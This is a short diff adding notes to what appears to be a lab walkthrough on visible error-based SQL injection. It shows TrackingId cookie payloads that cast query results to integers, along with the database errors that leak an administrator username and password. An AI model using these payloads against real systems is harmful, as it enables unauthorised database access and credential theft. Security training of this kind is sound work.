@@ -299,3 +299,8 @@ Lab13: Visible error-based SQL injection
 
       - Delete the original value of the TrackingId cookie 
          TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+
+      TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- : ERROR: invalid input syntax for type integer: "administrator"
+
+      TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- : ERROR: invalid input syntax for type integer: "7dyyovv2lwbtygr2bc7n"
+
